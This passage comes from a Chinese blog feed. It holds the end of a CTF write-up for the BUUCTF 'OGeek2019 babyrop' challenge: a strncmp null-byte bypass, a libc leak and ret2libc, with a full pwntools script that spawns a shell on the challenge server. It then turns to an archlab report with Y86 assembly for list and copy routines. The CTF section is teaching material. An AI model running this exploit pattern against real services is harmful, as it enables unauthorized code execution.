a1);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为前面传入的<code>buf</code>指针我们并不可以输入任何值，又是局部变量，所以它的值也是不确定的，然后下面比较要求<code>buf==s</code>字符串，而这个<code>s</code>是<code>main()</code>的<code>buf</code>，这个函数的<code>buf</code>是我们可以决定的。但是可惜它用的是<code>strncmp</code>指定长度比较字符串，而长度是从这个函数的buf里面算到的，那么我们就可以把字符串第一位置为<code>\x00</code>以躲过检测，然后返回了<code>buf[7]</code>，那么这里我们就知道应该输入<code>\x00</code>开始的字符串，至于后面还得看它这个返回值干了啥，返回<code>main()</code>函数发现返回值为下一个函数的参数，而下一个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">sub_80487D0</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    result = read(<span class="number">0</span>, buf, <span class="number">200u</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = read(<span class="number">0</span>, buf, a1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显我们要在这里溢出了，但是缓冲区大小有足足231，而第一个选项不足以让我们溢出，所以我们如果把参数设为<code>\xff</code>那么就能输入255长度的字符串足以让我们溢出。所以前面的一个<code>payload</code>就可以这么构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">payload1=b&#x27;\x00&#x27;*7+&#x27;\xff&#x27;</span><br></pre></td></tr></table></figure><p>但是找到了溢出点还不够，我们还没获取<code>system()</code>函数的地址，在<code>plt</code>表上也没有这个函数，所以我们打开<code>.so</code>文件，找到<code>system()</code>函数和<code>/bin/sh</code>字符串。注意我们反汇编的是<code>libc</code>文件，所以<code>system()</code>函数不跟平时一样在<code>plt</code>表，而是直接写在了代码段上面。</p><p><img src="https://i.loli.net/2021/05/13/5LD7viZ3xtYj4he.png" alt="buuctf _OGeek2019_babyrop_1.png"></p><p><img src="https://i.loli.net/2021/05/13/dzPSurgwslqWIcU.png" alt="buuctf _OGeek2019_babyrop_2.png"></p><p>为什么有这一步呢？因为我在学习的过程中，发现<code>libcsearcher</code>不好用了，在<code>python</code>里面只能用<code>ELF()</code>函数去加载<code>.so</code>文件，但是无法<code>search</code>到<code>/bin/sh</code>字符串所以就出现了这一步，然后我们需要执行两次这个<code>main()</code>函数，因为第一次溢出你只能泄露<code>libc</code>的地址。然后我来回答一下为什么不直接再次执行那个溢出的函数，因为我们要传参大于<code>0xe7+0x10</code>才可以溢出，而构造的<code>payload</code>链又比较麻烦，重新溢出最好挑那些没有参数或者参数对我们影响不大的去重新执行。第二次还好说，直接把<code>system()</code>地址和<code>/bin/sh</code>的<code>payload</code>传进去就ok。</p><h3 id="第一次溢出泄露libc的地址"><a href="#第一次溢出泄露libc的地址" class="headerlink" title="第一次溢出泄露libc的地址"></a>第一次溢出泄露libc的地址</h3><p>挑选能输出的函数<code>write()</code>，<code>puts()</code>都行，但是<code>write()</code>传参比较多，所以我就用<code>write()</code>，怕万一遇到没有<code>puts()</code>就不会了，所以多会点总是好的，比赛你当然怎么简单怎么来。<code>write()</code>要传的参数第一个传0，第二个传要泄露的<code>libc</code>函数的地址，第三个就是泄露的字节大小，32位程序四字节足矣，你泄露自己也行，我这里选了一个<code>read()</code>函数，道理都是一样的。那么第一次的<code>payload</code>就可以构造出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">0</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>然后就是先去算<code>libc</code>的基址，反推出<code>system()</code>的地址。</p><p><code>libc.sym[&#39;read&#39;]</code>会返回<code>read()</code>在<code>libc</code>里面的偏移，泄露出<code>read()</code>的真实地址就可以算出<code>libc</code>的真实基址了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read_addr=u32(p.recv(<span class="number">4</span>))<span class="comment">#拿到真实地址</span></span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#拿到真实基址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]read_addr: &#x27;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]libc_base_addr: &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>调试测试一下。</p><p><img src="https://i.loli.net/2021/05/13/C46D7uZNyKLh2Fr.png" alt="buuctf _OGeek2019_babyrop_3.png"></p><p>32位程序<code>libc</code>函数都是<code>0xf7</code>开头的，<code>libc</code>加载的时候会内存也对齐，所以末三位一定是0，所以我们这就得到了<code>libc</code>的真实地址。下面两步就把<code>system()</code>和<code>/bin/sh</code>算出来就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=system_addr+<span class="number">0x11e6eb</span></span><br></pre></td></tr></table></figure><p>因为好像并不能直接拿到这个偏移，但是可以在<code>gdb</code>里面调试得到<code>system()</code>相对<code>/bin/sh</code>的偏移，也可以前面<code>IDA</code>查看直接获取偏移，前面的那些地址就是我们所说的偏移，可以直接用，但是这里我们选择难一点的路线，就怕哪次给你直接断了那条简单路线，它不可能断你难的路线留一个简单的路线吧。</p><h3 id="第二次溢出直接执行system-“-bin-sh”"><a href="#第二次溢出直接执行system-“-bin-sh”" class="headerlink" title="第二次溢出直接执行system(“/bin/sh”)"></a>第二次溢出直接执行system(“/bin/sh”)</h3><p>这个payload就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(bin_sh_addr)</span><br></pre></td></tr></table></figure><p>但是一定注意前面的<code>payload1</code>也要再<code>send</code>一次，不然执行不到这里的，我就这里卡了很久。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,xxx)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=system_addr+<span class="number">0x11e6eb</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&#x27;[+]read_addr: &#x27;,hex(read_addr))</span></span><br><span class="line"><span class="comment">#print(&#x27;[+]libc_base_addr: &#x27;,hex(libc_base))</span></span><br><span class="line"><span class="comment">#print(&#x27;[+]system_addr: &#x27;,hex(system_addr))</span></span><br><span class="line"><span class="comment">#print(&#x27;[+]bin_sh: &#x27;,hex(bin_sh_addr))</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)<span class="comment">#一定要再给一次</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>archlab实验报告：y86命令使用</title>
      <link href="/2021/05/10/archlab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9Ay86%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/05/10/archlab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9Ay86%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>下载文件之后：</p><p>脑瓜子嗡嗡的，<code>writeup</code>看不懂，只能先去看看已有的实验报告，然后先做个总结——</p><p>先把里面的<code>sim.tar</code>解压了，然后进入目录之后<code>make clean</code>，<code>make</code>会在里面的所有文件该生成的文件生成了。</p><span id="more"></span><h1 id="part-A"><a href="#part-A" class="headerlink" title="part A"></a>part A</h1><p>这个部分的文件全在<code>misc</code>文件夹。</p><p>意思大概是用<code>y86</code>指令集实现<code>example.c</code>文件里面的三个函数，那也太棒了呀，我最擅长手写汇编了，汇编它虽然码起来效率低，但是能直接对底层进行操作，想想都激动<code>awa</code></p><p>要用到的指令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./yis xxx.ys  </span><br><span class="line">./yas xxx.yo</span><br></pre></td></tr></table></figure><p>第一条可以理解为汇编，第二条可以理解为链接且运行。</p><h2 id="sum-list"><a href="#sum-list" class="headerlink" title="sum_list"></a>sum_list</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sum_list - Sum the elements of a linked list */</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">sum_list</span><span class="params">(list_ptr ls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ls) &#123;</span><br><span class="line">        val += ls-&gt;val;</span><br><span class="line">        ls = ls-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是一个很朴素的链表求和，用循环实现。书上有例子的，那就直接把代码写下来吧，注释上写的挺清晰了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">    .pos 0#初始化</span><br><span class="line">    irmovq stack,%rsp#初始化一个栈帧</span><br><span class="line">    call main#执行主函数</span><br><span class="line">    halt#结束</span><br><span class="line">    .align 8#对齐</span><br><span class="line">ele1:#链表头</span><br><span class="line">    .quad 0x00a#链表值1</span><br><span class="line">    .quad ele2#连接下一个表</span><br><span class="line">ele2:</span><br><span class="line">    .quad 0x0b0#链表值2</span><br><span class="line">    .quad ele3#连接下一个表</span><br><span class="line">ele3:</span><br><span class="line">    .quad 0xc00#链表值3</span><br><span class="line">    .quad 0#NULL</span><br><span class="line">#This is main function</span><br><span class="line">main:</span><br><span class="line">    irmovq ele1,%rdi#传参</span><br><span class="line">    call sum_list#调用函数</span><br><span class="line">    ret </span><br><span class="line">sum_list:</span><br><span class="line">        irmovq $0,%r14</span><br><span class="line">        irmovq $0,%rax</span><br><span class="line">L2:</span><br><span class="line">        subq %r14,%rdi</span><br><span class="line">        je L4#到了NULL跳转L4返回</span><br><span class="line">        mrmovq (%rdi),%r13#取值</span><br><span class="line">        addq %r13,%rax#加给ax寄存器</span><br><span class="line">        mrmovq 8(%rdi),%rdi#下一个地址给%rdi</span><br><span class="line">        jmp     L2</span><br><span class="line">L4:</span><br><span class="line">        ret</span><br><span class="line">#stack starts here and grows to lower addresses</span><br><span class="line">    .pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://i.loli.net/2021/05/10/xhO3Tjqgw9EGBVa.png" alt="archlab_PartA_1.png"></p><p><code>while</code>实现方式有多种，下面几种都可以，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">L2:</span><br><span class="line">    //循环块</span><br><span class="line">    jnz L2</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">L2:</span><br><span class="line">    jz L4</span><br><span class="line">    //循环块</span><br><span class="line">    jmp L2</span><br><span class="line">L4:</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>……接下来读者自己想象吧</p><h2 id="rsum-list"><a href="#rsum-list" class="headerlink" title="rsum_list"></a>rsum_list</h2><p>这一次也是要一个链表求和，只是函数需要递归。</p><p>那么这次我们稍微改一下，把跳转到<code>L2</code>改成重新<code>call</code>一次就好了呗，这里不过多解释了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">    .pos 0#初始化</span><br><span class="line">    irmovq stack,%rsp#初始化一个栈帧</span><br><span class="line">    call main#执行主函数</span><br><span class="line">    halt#结束</span><br><span class="line">    .align 8#对齐</span><br><span class="line">ele1:#链表头</span><br><span class="line">    .quad 0x00a#链表值1</span><br><span class="line">    .quad ele2#连接下一个表</span><br><span class="line">ele2:</span><br><span class="line">    .quad 0x0b0#链表值2</span><br><span class="line">    .quad ele3#连接下一个表</span><br><span class="line">ele3:</span><br><span class="line">    .quad 0xc00#链表值3</span><br><span class="line">    .quad 0#NULL</span><br><span class="line">#This is main function</span><br><span class="line">main:</span><br><span class="line">    irmovq ele1,%rdi#传参</span><br><span class="line">    irmovq $0,%rax</span><br><span class="line">    call sum_list#调用函数</span><br><span class="line">    ret </span><br><span class="line">sum_list:</span><br><span class="line">        irmovq $0,%r13</span><br><span class="line">        subq %r13,%rdi</span><br><span class="line">        je L4#到了NULL跳转L4返回</span><br><span class="line">        mrmovq (%rdi),%r13#取值</span><br><span class="line">        addq %r13,%rax#加给ax寄存器</span><br><span class="line">        mrmovq 8(%rdi),%rdi#下一个地址给%rdi</span><br><span class="line">        call sum_list#递归调用</span><br><span class="line">L4:</span><br><span class="line">        ret</span><br><span class="line">#stack starts here and grows to lower addresses</span><br><span class="line">    .pos 0x400</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><p>但是我这个做法在编译应该是不存在的，真正递归的话每次调用都应该用<code>rax</code>保存返回值的，但是我没有，因为我们是直接写汇编指令的，所以不必那么麻烦(其实我也不知道符不符合要求，反正能过的程序)</p><p>贴一个运行结果吧:</p><p><img src="https://i.loli.net/2021/05/11/PWqVTabiOsw6zgj.png" alt="archlab_PartA_2.png"></p><p>(PS:就感觉这个<code>lab</code>我写的挺水的，分析的东西比较少，可能还是我菜吧<code>qwq</code>)</p><h2 id="copy-block"><a href="#copy-block" class="headerlink" title="copy_block"></a>copy_block</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* copy_block - Copy src to dest and return xor checksum of src */</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">copy_block</span><span class="params">(<span class="keyword">long</span> *src, <span class="keyword">long</span> *dest, <span class="keyword">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">long</span> val = *src++;</span><br><span class="line">        *dest++ = val;</span><br><span class="line">        result ^= val;</span><br><span class="line">        len--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这第三个函数跟链表关系不大了，给出源地址和目的地址，源地址保存了一些值，要将源地址开始的<code>len</code>长度的数据拷贝到目的地址，并且把拷贝的值异或起来并且返回。首先<code>len</code>为循环次数没得跑，那么就先可以构建出它循环的基本框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">L2:</span><br><span class="line">    //……</span><br><span class="line">    irmovq $1,%r9</span><br><span class="line">    subq %r9,%rdx</span><br><span class="line">    jne L2</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>然后略去的内容无非就是赋值，异或，然后就完了…最后注意一下在main函数把三个参数传好，64位的程序前六个参数依次给<code>rdi,rsi,rdx,rcx,r8,r9</code>寄存器，那么main函数就应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">    irmovq src,%rdi</span><br><span class="line">    irmovq dest,%rsi</span><br><span class="line">    irmovq xxx,%rdx//这里的xxx自己写，写了多长的数据给多少数值</span><br><span class="line">    call copy</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>那么自己再随便取一下<code>dest</code>和<code>src</code>汇编运行后就可以看到结果。</p><p>完整代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">    .pos 0#初始化</span><br><span class="line">    irmovq stack,%rsp#初始化一个栈帧</span><br><span class="line">    call main#执行主函数</span><br><span class="line">    halt#结束</span><br><span class="line">    .align 8#对齐</span><br><span class="line">src:</span><br><span class="line">        .quad 0x00a</span><br><span class="line">        .quad 0x0b0</span><br><span class="line">        .quad 0xc00</span><br><span class="line">dest:</span><br><span class="line">        .quad 0x111</span><br><span class="line">        .quad 0x222</span><br><span class="line">        .quad 0x333</span><br><span class="line">#This is main function</span><br><span class="line">main:</span><br><span class="line">        irmovq src,%rdi</span><br><span class="line">        irmovq dest,%rsi</span><br><span class="line">    irmovq $3,%rdx#argument len</span><br><span class="line">    call copy</span><br><span class="line">    ret </span><br><span class="line">copy:</span><br><span class="line">    irmovq $0,%rax</span><br><span class="line">    irmovq $1,%r9</span><br><span class="line">    irmovq $8,%r10</span><br><span class="line">L1:</span><br><span class="line">        mrmovq (%rdi),%r8</span><br><span class="line">        xorq %r8,%rax</span><br><span class="line">        rmmovq %r8,(%rsi)</span><br><span class="line">        addq %r10,%rdi</span><br><span class="line">        addq %r10,%rsi</span><br><span class="line">        subq %r9,%rdx</span><br><span class="line">        jne L1</span><br><span class="line">        ret</span><br><span class="line">#stack starts here and grows to lower addresses</span><br><span class="line">    .pos 0x200</span><br><span class="line">stack:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果我们具体关注一下<code>111,222,333</code>内存里面的值有没有分别被修改为对应值以及返回的异或值是否与自己计算的是否相等就行了</p><p><img src="https://i.loli.net/2021/05/11/DOyk6t2KHBoQCpj.png" alt="archlab_PartA_3.png"></p><p>这样的话<code>Part A</code>就撒花啦</p><h1 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h1><p>测评方式:在<code>ptest</code>目录下执行以下命令。</p><p><code>make SIM=../seq/ssim</code></p><p>这个<code>Part B</code>大概意思就是在<code>hcl</code>文件添加一个指令<code>iaddq</code>，这个咱们照本宣科在seq-full.hcl文件对应位置加上这个指令的名称就行了，最后文件修改成这个样子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span 